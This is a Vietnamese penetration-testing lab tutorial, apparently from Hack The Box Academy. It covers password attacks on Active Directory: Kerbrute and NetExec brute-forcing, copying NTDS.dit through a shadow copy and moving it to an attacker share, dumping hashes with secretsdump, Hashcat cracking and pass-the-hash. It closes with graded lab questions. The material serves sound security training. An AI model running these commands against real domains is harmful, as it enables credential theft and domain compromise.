# Tấn công Active Directory và NTDS.dit

Active Directory (**AD**) là một dịch vụ thư mục phổ biến và cực kỳ quan trọng trong các mạng doanh nghiệp hiện đại. AD là thứ chúng ta sẽ gặp đi gặp lại rất nhiều, nên cần phải quen thuộc với nhiều phương pháp khác nhau để tấn công cũng như phòng thủ cho các môi trường này. Có thể khẳng định rằng nếu tổ chức sử dụng Windows thì AD sẽ được dùng để quản lý các hệ thống Windows đó. Tấn công AD là một chủ đề rộng lớn và quan trọng đến mức chúng ta có nhiều module riêng dành cho nó.

Trong phần này, chúng ta sẽ tập trung chủ yếu vào cách trích xuất thông tin đăng nhập (credentials) thông qua việc sử dụng tấn công từ điển (dictionary attack) nhắm vào các tài khoản AD và dump hash từ tệp `NTDS.dit`.

Giống như nhiều cuộc tấn công đã đề cập từ trước đến giờ, mục tiêu của chúng ta phải tiếp cận được qua mạng. Điều này có nghĩa là rất có khả năng chúng ta cần có một chỗ đứng (foothold) đã được thiết lập trên mạng nội bộ mà mục tiêu đang kết nối tới. Tuy vậy, cũng có những tình huống một tổ chức sử dụng port forwarding để chuyển tiếp giao thức remote desktop (`3389`) hoặc các giao thức khác dùng cho truy cập từ xa trên router biên (edge router) tới một hệ thống trong mạng nội bộ của họ. Xin lưu ý rằng hầu hết các phương pháp trong module này mô phỏng các bước **sau** khi đã xâm nhập ban đầu và đã thiết lập được foothold trên mạng nội bộ. Trước khi bắt tay vào thực hành các phương pháp tấn công, hãy cùng xem xét quá trình xác thực (authentication) sau khi một hệ thống Windows đã được join vào domain. Cách tiếp cận này sẽ giúp chúng ta hiểu rõ hơn tầm quan trọng của Active Directory và những kiểu tấn công mật khẩu mà nó dễ bị tổn thương.

![Sơ đồ luồng xác thực khi máy Windows đã join domain: lsass.exe, Authentication Packages, NTLM, Kerberos, Netlogon và AD Directory Services](images/so-do-xac-thuc-ad.png)

Khi một hệ thống Windows đã được join vào một domain, nó sẽ **không còn mặc định tham chiếu đến cơ sở dữ liệu SAM để xác thực các yêu cầu đăng nhập** (`no longer default to referencing the SAM database to validate logon requests`). Hệ thống đã join domain đó giờ sẽ gửi các yêu cầu xác thực để được domain controller kiểm chứng trước khi cho phép người dùng đăng nhập. Điều này không có nghĩa là cơ sở dữ liệu SAM không còn dùng được nữa. Người muốn đăng nhập bằng tài khoản cục bộ (local account) trong cơ sở dữ liệu SAM vẫn có thể làm được bằng cách chỉ định `hostname` của thiết bị theo sau bởi `Username` (ví dụ: `WS01\nameofuser`) hoặc khi có quyền truy cập trực tiếp vào thiết bị thì gõ `.\` ở giao diện đăng nhập trong ô `Username`. Điều này đáng lưu tâm vì chúng ta cần để ý xem những thành phần hệ thống nào bị ảnh hưởng bởi các cuộc tấn công mà mình thực hiện. Nó cũng có thể mở ra thêm những hướng tấn công để cân nhắc khi nhắm vào hệ điều hành Windows desktop hay Windows server, dù là truy cập vật lý trực tiếp hay qua mạng. Hãy nhớ rằng chúng ta cũng có thể nghiên cứu các cuộc tấn công NTDS bằng cách theo dõi kỹ thuật này.

## Tấn công từ điển nhắm vào các tài khoản AD bằng NetExec

Hãy nhớ rằng một cuộc tấn công từ điển về bản chất là dùng sức mạnh của máy tính để đoán tên người dùng và/hoặc mật khẩu bằng một danh sách tùy chỉnh gồm các tên người dùng và mật khẩu tiềm năng. Việc thực hiện các cuộc tấn công này qua mạng có thể khá "ồn ào" (`noisy` — dễ bị phát hiện) vì chúng có thể sinh ra rất nhiều lưu lượng mạng và cảnh báo trên hệ thống mục tiêu, đồng thời cuối cùng có thể bị từ chối do các giới hạn số lần đăng nhập được áp dụng thông qua Group Policy.

Khi rơi vào tình huống mà tấn công từ điển là một bước đi hợp lý tiếp theo, chúng ta sẽ được lợi nếu cố gắng "may đo" (tailor) cuộc tấn công càng sát càng tốt. Trong trường hợp này, ta có thể xem xét tổ chức mà mình đang thực hiện engagement và dùng các tìm kiếm trên nhiều trang mạng xã hội cũng như tìm danh bạ nhân viên trên website của công ty. Làm vậy có thể giúp ta thu thập được tên các nhân viên đang làm việc tại tổ chức. Một trong những thứ đầu tiên mà một nhân viên mới nhận được là một tên người dùng (username). Nhiều tổ chức tuân theo một quy ước đặt tên khi tạo username cho nhân viên. Dưới đây là một số quy ước phổ biến cần lưu ý:

| Quy ước đặt username | Ví dụ thực tế cho `Jane Jill Doe` |
|---|---|
| `firstinitiallastname` | `jdoe` |
| `firstinitialmiddleinitiallastname` | `jjdoe` |
| `firstnamelastname` | `janedoe` |
| `firstname.lastname` | `jane.doe` |
| `lastname.firstname` | `doe.jane` |
| `nickname` | `doedoehacksstuff` |

Thông thường, cấu trúc của một địa chỉ email sẽ tiết lộ username của nhân viên (cấu trúc: `username@domain`). Ví dụ, từ địa chỉ email `jdoe @ inlanefreight.com`, ta có thể suy ra `jdoe` chính là username.

> **Một mẹo từ `MrB3n`:** Chúng ta thường có thể tìm ra cấu trúc email bằng cách Google tên domain, ví dụ `"@inlanefreight.com"`, và lấy được một số email hợp lệ. Từ đó, ta có thể dùng một script để cào (scrape) nhiều trang mạng xã hội khác nhau và ghép lại thành các username tiềm năng hợp lệ. Một số tổ chức cố gắng làm rối (obfuscate) username của mình để ngăn tấn công spraying, nên họ có thể đặt bí danh (alias) cho username kiểu như `a907` (hoặc tương tự) trỏ về `joe.smith`. Bằng cách đó, các thư điện tử vẫn đến được nơi nhận, nhưng username nội bộ thực sự không bị lộ, khiến việc password spraying khó khăn hơn. Đôi khi bạn có thể dùng google dorks để tìm `"inlanefreight.com filetype:pdf"` và tìm thấy một số username hợp lệ trong phần thuộc tính (properties) của tệp PDF nếu chúng được tạo ra bằng một trình biên tập đồ họa. Từ đó, bạn có thể nhận ra được cấu trúc username và có khả năng viết một script nhỏ để tạo ra nhiều tổ hợp có thể có, rồi spray để xem có cái nào hợp lệ không.

### Tạo một danh sách username tùy chỉnh

Giả sử chúng ta đã nghiên cứu và thu thập được một danh sách tên dựa trên thông tin công khai. Ta sẽ giữ danh sách tương đối ngắn cho mục đích bài học này vì các tổ chức có thể có số lượng nhân viên khổng lồ. Danh sách tên ví dụ:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

Chúng ta có thể tạo một danh sách tùy chỉnh trên máy tấn công (attack host) bằng những cái tên trên. Ta có thể dùng một trình soạn thảo văn bản dòng lệnh như `Vim` hoặc một trình soạn thảo đồ họa để tạo danh sách. Danh sách có thể trông như sau:

```shellsession
naruto3co@htb[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Tất nhiên đây chỉ là một ví dụ và chưa bao gồm hết tất cả các tên, nhưng hãy để ý cách chúng ta có thể đưa vào một quy ước đặt tên khác nhau cho từng người trong trường hợp chưa biết quy ước đặt tên mà tổ chức mục tiêu đang dùng.

Chúng ta có thể tự tay tạo danh sách hoặc dùng một trình tạo danh sách tự động (`automated list generator`) như công cụ **Username Anarchy** viết bằng Ruby để chuyển đổi một danh sách tên thật thành các định dạng username phổ biến. Sau khi công cụ được clone về máy tấn công cục bộ bằng `Git`, ta có thể chạy nó với một danh sách tên thật như ví dụ output dưới đây:

```shellsession
naruto3co@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

Việc dùng các công cụ tự động có thể giúp tiết kiệm thời gian khi tạo danh sách. Dù vậy, chúng ta vẫn sẽ được lợi nếu dành nhiều thời gian nhất có thể để cố gắng khám phá ra quy ước đặt tên mà tổ chức đang dùng cho username, vì điều này sẽ giảm bớt nhu cầu phải đoán quy ước đặt tên.

Lý tưởng nhất là hạn chế việc phải đoán càng nhiều càng tốt khi tiến hành các cuộc tấn công mật khẩu.

### Liệt kê (enumerate) các username hợp lệ bằng Kerbrute

Trước khi bắt đầu đoán mật khẩu cho những username thậm chí có thể không tồn tại, có lẽ nên xác định quy ước đặt tên đúng và xác nhận tính hợp lệ của một số username. Ta có thể làm điều này bằng một công cụ như **Kerbrute**. Kerbrute có thể dùng để brute-force, password spraying và liệt kê username. Ngay lúc này, chúng ta chỉ quan tâm đến việc liệt kê username, và nó sẽ trông như sau:

```shellsession
naruto3co@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ / / /_/ / / / /_/ / /_/  __/
/_/|_|\___/_/ /_.___/_/  \__,_/\__/\___/ 

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME: bwilliamson@inlanefreight.local
<SNIP>
```

### Khởi động một cuộc tấn công brute-force bằng NetExec

Khi đã chuẩn bị xong danh sách hoặc đã khám phá ra quy ước đặt tên cùng một số tên nhân viên, ta có thể khởi động một cuộc tấn công brute-force nhắm vào domain controller mục tiêu bằng một công cụ như **NetExec**. Ta có thể dùng nó kết hợp với giao thức SMB để gửi các yêu cầu đăng nhập tới Domain Controller mục tiêu. Dưới đây là lệnh để thực hiện:

```shellsession
naruto3co@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB    10.129.201.57    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE
SMB    10.129.201.57    445    DC01    [+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

Trong ví dụ này, NetExec đang dùng SMB để thử đăng nhập với tư cách người dùng (`-u`) `bwilliamson`, sử dụng một danh sách mật khẩu (`-p`) chứa các mật khẩu thường dùng (`/usr/share/wordlists/fasttrack.txt`). Nếu quản trị viên đã cấu hình chính sách khóa tài khoản (account lockout policy), cuộc tấn công này có thể làm khóa chính tài khoản mà ta đang nhắm tới. Tại thời điểm viết bài này (tháng 1 năm 2022), chính sách khóa tài khoản không được thực thi mặc định với các group policy mặc định áp dụng cho một Windows domain, nghĩa là hoàn toàn có khả năng ta sẽ gặp phải những môi trường dễ bị tổn thương trước đúng kiểu tấn công mà ta đang thực hành.

### Nhật ký sự kiện (event logs) từ cuộc tấn công

![Event Viewer hiển thị các sự kiện Security được ghi lại trong cuộc tấn công, bao gồm Event ID 4776 và 4624](images/event-viewer.png)

Việc biết được cuộc tấn công có thể để lại những dấu vết gì là rất hữu ích. Biết điều này có thể giúp cho các khuyến nghị khắc phục (remediation) của chúng ta trở nên có tác động và giá trị hơn đối với khách hàng mà ta đang làm việc cùng. Trên bất kỳ hệ điều hành Windows nào, quản trị viên có thể mở `Event Viewer` và xem các sự kiện Security để thấy chính xác các hành động đã được ghi lại. Điều này có thể giúp đưa ra quyết định triển khai các biện pháp kiểm soát an ninh nghiêm ngặt hơn và hỗ trợ cho bất kỳ cuộc điều tra tiềm năng nào có thể xảy ra sau một vụ vi phạm.

Sau khi đã khám phá được một số thông tin đăng nhập, ta có thể tiến hành cố gắng giành quyền truy cập từ xa vào domain controller mục tiêu và chiếm lấy tệp NTDS.dit.

## Chiếm lấy (capturing) NTDS.dit

NT Directory Services (`NTDS`) là dịch vụ thư mục được dùng với AD để tìm và tổ chức các tài nguyên mạng. Nhớ lại rằng tệp `NTDS.dit` được lưu tại `%systemroot%/ntds` trên các domain controller trong một forest. Phần `.dit` là viết tắt của **directory information tree** (cây thông tin thư mục). Đây là tệp cơ sở dữ liệu chính gắn với AD, lưu trữ toàn bộ username, password hash và các thông tin schema quan trọng khác của domain. Nếu tệp này bị chiếm được, ta có khả năng xâm phạm mọi tài khoản trên domain, tương tự kỹ thuật đã đề cập trong phần `Attacking SAM, SYSTEM, and SECURITY` của module này. Khi thực hành kỹ thuật này, hãy cân nhắc tầm quan trọng của việc bảo vệ AD và động não vài cách để ngăn chặn cuộc tấn công này xảy ra.

### Kết nối tới một DC bằng Evil-WinRM

Chúng ta có thể kết nối tới DC mục tiêu bằng các thông tin đăng nhập đã chiếm được.

```shellsession
naruto3co@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM kết nối tới mục tiêu bằng dịch vụ Windows Remote Management kết hợp với PowerShell Remoting Protocol để thiết lập một phiên PowerShell với mục tiêu.

### Kiểm tra thành viên nhóm cục bộ (local group membership)

Khi đã kết nối, ta có thể kiểm tra xem `bwilliamson` có những quyền gì. Ta có thể bắt đầu bằng việc xem thành viên nhóm cục bộ với lệnh:

```shellsession
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Chúng ta đang muốn xem tài khoản này có quyền local admin hay không. Để tạo được một bản sao của tệp NTDS.dit, ta cần quyền local admin (nhóm `Administrators`) hoặc Domain Admin (nhóm `Domain Admins`) (hoặc quyền tương đương). Ta cũng sẽ muốn kiểm tra xem mình có những quyền domain nào.

### Kiểm tra quyền của tài khoản người dùng, bao gồm cả quyền domain

```shellsession
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users          *Domain Admins
The command completed successfully.
```

Tài khoản này có cả quyền Administrators lẫn Domain Administrator, nghĩa là ta có thể làm gần như mọi thứ mình muốn, bao gồm cả việc tạo một bản sao của tệp NTDS.dit.

### Tạo shadow copy của ổ C:

Chúng ta có thể dùng `vssadmin` để tạo một Volume Shadow Copy (`VSS`) của ổ `C:` hoặc bất cứ volume nào mà quản trị viên đã chọn khi cài đặt AD ban đầu. Rất có khả năng NTDS sẽ được lưu trên `C:` vì đó là vị trí mặc định được chọn khi cài đặt, nhưng vẫn có thể thay đổi vị trí này. Ta dùng VSS cho việc này vì nó được thiết kế để tạo bản sao của các volume có thể đang được đọc và ghi một cách chủ động (actively) mà không cần phải tắt một ứng dụng hay hệ thống cụ thể. VSS được nhiều phần mềm sao lưu và phục hồi thảm họa (backup and disaster recovery) khác nhau sử dụng để thực hiện các thao tác.

```shellsession
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Sao chép NTDS.dit từ VSS

Sau đó ta có thể sao chép tệp `NTDS.dit` từ volume shadow copy của `C:` sang một vị trí khác trên ổ đĩa để chuẩn bị di chuyển NTDS.dit sang máy tấn công.

```shellsession
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Trước khi sao chép `NTDS.dit` sang máy tấn công, ta có thể muốn dùng kỹ thuật đã học trước đó để tạo một SMB share trên máy tấn công. Bạn có thể quay lại phần `Attacking SAM, SYSTEM, and SECURITY` để xem lại phương pháp đó nếu cần.

> **Lưu ý:** Cũng như trường hợp với `SAM`, các hash lưu trong `NTDS.dit` được mã hóa bằng một khóa lưu trong `SYSTEM`. Để trích xuất hash thành công, ta phải tải xuống cả hai tệp.

### Chuyển NTDS.dit sang máy tấn công

Bây giờ có thể dùng `cmd.exe /c move` để di chuyển tệp từ DC mục tiêu sang share trên máy tấn công của ta.

```shellsession
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData

        1 file(s) moved.
```

### Trích xuất hash từ NTDS.dit

Với một bản sao của `NTDS.dit` trên máy tấn công, ta có thể tiến hành dump hash. Một cách để làm điều này là dùng `secretsdump` của Impacket:

```shellsession
naruto3co@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b5...
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c...
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced8...
<SNIP>
```

### Một cách nhanh hơn: Dùng NetExec để chiếm NTDS.dit

Ngoài ra, ta có thể được lợi khi dùng NetExec để thực hiện chính các bước trên, tất cả chỉ với một lệnh duy nhất. Lệnh này cho phép ta tận dụng VSS để nhanh chóng chiếm và dump nội dung của tệp NTDS.dit một cách tiện lợi ngay trong phiên terminal của mình.

```shellsession
naruto3co@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB       10.129.201.57  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB       10.129.201.57  445  DC01  [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL  10.129.201.57  445  DC01  [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL  10.129.201.57  445  DC01  Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL  10.129.201.57  445  DC01  [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL  10.129.201.57  445  DC01  [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL  10.129.201.57  445  DC01  [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL  10.129.201.57  445  DC01  [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL  10.129.201.57  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL  10.129.201.57  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b5...
NTDSUTIL  10.129.201.57  445  DC01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c...
NTDSUTIL  10.129.201.57  445  DC01  DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee...
NTDSUTIL  10.129.201.57  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced8...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2e...
NTDSUTIL  10.129.201.57  445  DC01  WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f12...
NTDSUTIL  10.129.201.57  445  DC01  WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec9076...
NTDSUTIL  10.129.201.57  445  DC01  WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45e...
NTDSUTIL  10.129.201.57  445  DC01  WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10...
NTDSUTIL  10.129.201.57  445  DC01  WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf56...
NTDSUTIL  10.129.201.57  445  DC01  WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f560...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff0...
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa8...
NTDSUTIL  10.129.201.57  445  DC01  Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL  10.129.201.57  445  DC01  Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL  10.129.201.57  445  DC01  Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL  10.129.201.57  445  DC01  DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL  10.129.201.57  445  DC01  DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL  10.129.201.57  445  DC01  DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL  10.129.201.57  445  DC01  krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL  10.129.201.57  445  DC01  krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL  10.129.201.57  445  DC01  krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL  10.129.201.57  445  DC01  inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL  10.129.201.57  445  DC01  WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL  10.129.201.57  445  DC01  WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-96:...
NTDSUTIL  10.129.201.57  445  DC01  [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL  10.129.201.57  445  DC01  [*] To extract only enabled accounts from the output file, run the following command:
NTDSUTIL  10.129.201.57  445  DC01  [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

## Bẻ khóa (cracking) hash và giành thông tin đăng nhập

Chúng ta có thể tiến hành tạo một tệp văn bản chứa tất cả các NT hash, hoặc có thể sao chép và dán riêng một hash cụ thể vào phiên terminal và dùng Hashcat để cố gắng bẻ khóa hash đó ra mật khẩu ở dạng cleartext.

### Bẻ khóa một hash đơn lẻ bằng Hashcat

```shellsession
naruto3co@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Trong nhiều kỹ thuật mà chúng ta đã đề cập từ trước đến giờ, ta đã thành công trong việc bẻ khóa các hash lấy được.

**Nếu chúng ta không thành công trong việc bẻ khóa một hash thì sao?**

## Cân nhắc về Pass the Hash (PtH)

Chúng ta vẫn có thể dùng hash để cố gắng xác thực với một hệ thống bằng một loại tấn công gọi là **Pass-the-Hash** (`PtH`). Một cuộc tấn công PtH tận dụng giao thức xác thực **NTLM** để xác thực một người dùng bằng một password hash. Thay vì dùng định dạng đăng nhập là `username : clear-text password`, ta có thể dùng `username : password hash` thay thế. Dưới đây là ví dụ về cách nó hoạt động:

### Ví dụ Pass the Hash (PtH) với Evil-WinRM

```shellsession
naruto3co@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

Chúng ta có thể thử dùng cuộc tấn công này khi cần di chuyển ngang (move laterally) qua mạng sau khi đã xâm nhập ban đầu một mục tiêu. Nhiều nội dung hơn về PtH sẽ được đề cập trong module `AD Enumeration and Attacks`.

---

## Câu hỏi (Connect to HTB)

Spawn hệ thống mục tiêu để lấy IP và trả lời các câu hỏi. Hãy trả lời bằng tiếng Anh để đảm bảo phản hồi chính xác.

**Câu hỏi 1** (+40): Tên của tệp được lưu trên một domain controller chứa các password hash của tất cả tài khoản domain là gì? (Định dạng: `****.***`)

**Câu hỏi 2** (+40): Nộp NT hash gắn với người dùng Administrator từ output ví dụ trong phần đọc của mục này.

**Câu hỏi 3** (+40): Trong một engagement, bạn đã vào nhiều trang mạng xã hội và tìm thấy tên các nhân viên Inlanefreight: John Marston — IT Director, Carol Johnson — Financial Controller, và Jennifer Stapleton — Logistics Manager. Bạn quyết định dùng những cái tên này để tiến hành các cuộc tấn công mật khẩu nhắm vào domain controller mục tiêu. Nộp thông tin đăng nhập của John Marston làm câu trả lời. (Định dạng: `username:password`, phân biệt hoa/thường)

**Câu hỏi 4** (+40): Chiếm lấy tệp NTDS.dit và dump các hash. Dùng các kỹ thuật đã dạy trong phần này để bẻ khóa mật khẩu của Jennifer Stapleton. Nộp mật khẩu cleartext của cô ấy làm câu trả lời. (Định dạng: phân biệt hoa/thường)
